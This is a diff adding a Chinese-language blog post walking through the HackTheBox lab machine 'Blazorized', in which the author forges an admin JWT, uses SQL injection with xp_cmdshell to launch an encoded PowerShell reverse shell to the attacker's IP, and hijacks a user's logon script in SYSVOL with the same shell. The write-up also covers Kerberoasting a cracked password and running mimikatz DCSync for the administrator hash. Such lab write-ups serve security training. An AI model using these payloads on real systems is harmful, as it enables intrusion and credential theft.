@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-H-Blazorized | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-Blazorized提出疑问 js抓取然后获得dll这边的手法我这残缺，我正常bp抓包的没有抓取到这个dll的调用 jwt这个参数说是用Blazor Traffic Processor工具来分析这个raw，这个raw我翻遍了我的bp我也没有找到  正常步骤 显示爆破了一下子域名，出admin,然后↓这个出现api子域名的调用，写入hosts  广告然后再点击一下check，浏览了一下发现有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-H-Blazorized">
+<meta property="og:url" content="http://example.com/2025/05/23/HTB-H-Blazorized/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="HTB-Blazorized提出疑问 js抓取然后获得dll这边的手法我这残缺，我正常bp抓包的没有抓取到这个dll的调用 jwt这个参数说是用Blazor Traffic Processor工具来分析这个raw，这个raw我翻遍了我的bp我也没有找到  正常步骤 显示爆破了一下子域名，出admin,然后↓这个出现api子域名的调用，写入hosts  广告然后再点击一下check，浏览了一下发现有">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-05-23T12:52:08.000Z">
+<meta property="article:modified_time" content="2025-05-23T13:03:22.261Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/05/23/HTB-H-Blazorized/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-H-Blazorized',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-H-Blazorized</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-H-Blazorized</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-23T12:52:08.000Z" title="Created 2025-05-23 20:52:08">2025-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-23T13:03:22.261Z" title="Updated 2025-05-23 21:03:22">2025-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/penetration/">penetration</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>5mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-Blazorized"><a href="#HTB-Blazorized" class="headerlink" title="HTB-Blazorized"></a>HTB-Blazorized</h1><h3 id="提出疑问"><a href="#提出疑问" class="headerlink" title="提出疑问"></a>提出疑问</h3><ul>
+<li>js抓取然后获得dll这边的手法我这残缺，我正常bp抓包的没有抓取到这个dll的调用</li>
+<li>jwt这个参数说是用Blazor Traffic Processor工具来分析这个raw，这个raw我翻遍了我的bp我也没有找到</li>
+</ul>
+<p>正常步骤</p>
+<p>显示爆破了一下子域名，出admin,然后↓这个出现api子域名的调用，写入hosts</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250512191310405.png?raw=true" alt="image-20250512191310405"></p>
+<h3 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h3><p>然后再点击一下check，浏览了一下发现有不错的广告资料，copy一份</p>
+<p>Title: Active Directory</p>
+<p>Below are links to projects and posts relating AD red-teaming:</p>
+<pre><code>https://github.com/Group3r/Group3r
+https://github.com/Leo4j/Amnesiac
+https://github.com/JPG0mez/ADCSync
+https://github.com/Processus-Thief/HEKATOMB
+https://github.com/Mazars-Tech/AD_Miner
+https://github.com/AlmondOffSec/PassTheCert
+https://github.com/synacktiv/ntdissector
+https://github.com/Hackndo/pyGPOAbuse
+https://exploit.ph/external-trusts-are-evil.html
+https://github.com/SecuraBV/Timeroast
+https://github.com/SadProcessor/CypherDog
+https://mayfly277.github.io/
+</code></pre>
+<p>Title: Active Directory</p>
+<p>Below are links to projects and posts relating AD blue-teaming:</p>
+<pre><code>https://github.com/lkarlslund/Adalanche
+https://github.com/FalconForceTeam/FalconHound
+https://github.com/csababarta/ntdsxtract
+https://github.com/adrecon/ADRecon
+</code></pre>
+<p>Title: Uncategorized</p>
+<p>The below research papers are uncategorized, and are to be investigated later:</p>
+<pre><code>https://thume.ca/2023/12/02/tracing-methods/
+https://zakird.com/papers/tangled_web.pdf
+https://jhalderm.com/pub/papers/censys-ccs15.pdf
+https://jhalderm.com/pub/papers/zmap10gig-woot14.pdf
+https://zakird.com/papers/lzr.pdf
+https://zakird.com/papers/zlint.pdf
+https://zakird.com/papers/zdns.pdf
+</code></pre>
+<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>这边是看他文章说是api这便用的管理员的身份，jwt解一下可以看到管理员的邮箱</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250512200244579.png?raw=true" alt="image-20250512200244579"></p>
+<p>然而没有利用点</p>
+<p>批量下载dll</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://blazorized.htb/_framework/blazor.boot.json | jq | grep dll | cut -d &#x27;:&#x27; -f 1 | sed -e &#x27;s/\ //g&#x27; -e &#x27;s/&quot;//g&#x27; | xargs -I % curl -s http://blazorized.htb/_framework/% -o ./DLLs/%</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250512223702700.png?raw=true" alt="image-20250512223702700"></p>
+<p>伪造JWT</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250512223508651.png?raw=true" alt="image-20250512223508651"></p>
+<p>或者通过脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">from time import time</span><br><span class="line"></span><br><span class="line">secret = &quot;8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;: &quot;superadmin@blazorized.htb&quot;,</span><br><span class="line">    &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;: &quot;Super_Admin&quot;,</span><br><span class="line">    &quot;iss&quot;: &quot;http://api.blazorized.htb&quot;,</span><br><span class="line">    &quot;aud&quot;: &quot;http://admin.blazorized.htb&quot;,</span><br><span class="line">    &quot;exp&quot;: int(time() + 60 * 60 * 24 * 10),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(data, secret, algorithm=&#x27;HS512&#x27;)</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
+<p>虽然生成了，但在我这里没有生效</p>
+<p>我直接在我的火狐浏览器的cookie那写不好使，不懂偶，然后我用下边的方法跑了一下就生效了👇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let token = &#x27;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzQ3OTI2ODcwfQ.WlUtJeMxxS6QGYaQjJ342qaYs7Jox8dAZRey83cPDUBPAk2nOPgEHpdPevk9Zqh4Gvhoe14NWySswpia9piiwA&#x27;;</span><br><span class="line"></span><br><span class="line">localStorage.setItem(&#x27;jwt&#x27;, token);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="后台命令执行"><a href="#后台命令执行" class="headerlink" title="后台命令执行"></a>后台命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1; EXEC MASTER.sys.xp_cmdshell &#x27;curl 10.10.16.2:444&#x27; -- -</span><br></pre></td></tr></table></figure>
+
+<p>nc一下有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1; EXEC MASTER.sys.xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<h2 id="获得shell-nu-1055"><a href="#获得shell-nu-1055" class="headerlink" title="获得shell-&gt;nu_1055"></a>获得shell-&gt;nu_1055</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;http://10.10.16.2/accesschk.exe&#x27; -OutFile &#x27;C:\Temp\accesschk.exe&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>SharpHound.exe -c all</p>
+<p>然后传给Kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Temp\20250513004319_BloodHound.zip&quot;))</span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动1-rsa-4810"><a href="#横向移动1-rsa-4810" class="headerlink" title="横向移动1-&gt;rsa_4810"></a>横向移动1-&gt;rsa_4810</h2><p>打WriteSPN</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250513112813572.png?raw=true" alt="image-20250513112813572"></p>
+<p>为了执行有针对性的 Kerberoasting，我将为 RSA_4810 账户分配一个 SPN。然后我可以作为该假冒服务请求票据，并获得一个使用 RSA_4810 密码加密的票据来破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Temp&gt; . .\PowerView.ps1    </span><br><span class="line">PS C:\Temp&gt; Set-DomainObject -Identity RSA_4810 -Set @&#123;serviceprincipalname=&#x27;nonexistent/BLAHBLAH&#x27;&#125;</span><br><span class="line">PS C:\Temp&gt; Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash</span><br><span class="line">得到的hash拿去john得到(Ni7856Do9854Ki05Ng0005 #) (?) </span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动2-ssa-6010"><a href="#横向移动2-ssa-6010" class="headerlink" title="横向移动2-&gt;ssa_6010"></a>横向移动2-&gt;ssa_6010</h2><h3 id="检查下一个用户"><a href="#检查下一个用户" class="headerlink" title="检查下一个用户"></a>检查下一个用户</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250513142416843.png?raw=true" alt="image-20250513142416843"></p>
+<p>可以发现这个用户每分钟登陆一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查最近登陆时间</span><br><span class="line">[DateTime]::FromFileTime((Get-ADUser SSA_6010 -properties LastLogon).LastLogon)</span><br><span class="line">当前时间</span><br><span class="line">date</span><br></pre></td></tr></table></figure>
+
+<p>检查用户的登陆脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser SSA_6010 -properties ScriptPath</span><br></pre></td></tr></table></figure>
+
+<p>没有做设置，那就设一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser SSA_6010 | Set-ADUser -ScriptPath &#x27;ddl&#x27;</span><br><span class="line"></span><br><span class="line">Get-ADUser SSA_6010 -properties ScriptPath</span><br></pre></td></tr></table></figure>
+
+<h3 id="然后检查可写目录"><a href="#然后检查可写目录" class="headerlink" title="然后检查可写目录"></a>然后检查可写目录</h3><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250513142504726.png?raw=true" alt="image-20250513142504726"></p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">upload /home/kali/ppyy/tool/powershell/accesschk.exe C:\Temp\</span><br><span class="line"></span><br><span class="line">.\accesschk.exe /accepteula -uwds blazorized\rsa_4810 C:\Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后查查看当前账户对这个文件夹的权限</span><br><span class="line">icacls \Windows\SYSVOL\domain\scripts\A32FF3AEAA23</span><br><span class="line">有完全控制权，进去</span><br><span class="line">cd C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23</span><br></pre></td></tr></table></figure>
+
+<h3 id="然后写码"><a href="#然后写码" class="headerlink" title="然后写码"></a>然后写码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot; | Out-File -FilePath ddl.bat -Encoding ASCII</span><br></pre></td></tr></table></figure>
+
+<h3 id="给成员属性赋值"><a href="#给成员属性赋值" class="headerlink" title="给成员属性赋值"></a>给成员属性赋值</h3><p>就是指定脚本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser SSA_6010 | Set-ADUser -ScriptPath &#x27;A32FF3AEAA23\ddl.bat&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>之后监听等1分钟shell就来了</p>
+<h2 id="本地DCSync-administrator"><a href="#本地DCSync-administrator" class="headerlink" title="本地DCSync-&gt;administrator"></a>本地DCSync-&gt;administrator</h2><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250513140453333.png?raw=true" alt="image-20250513140453333"></p>
+<p>有DCSync 权限，SSA_6010 可以导出域中的所有哈希值</p>
+<p>把mimikatz传上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;http://10.10.16.2/mimikatz64.exe&#x27; -OutFile &#x27;C:\Temp\mimikatz64.exe&#x27;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.\mimikatz64.exe &quot;lsadump::dcsync /user:administrator&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250513135932368.png?raw=true" alt="image-20250513135932368"></p>
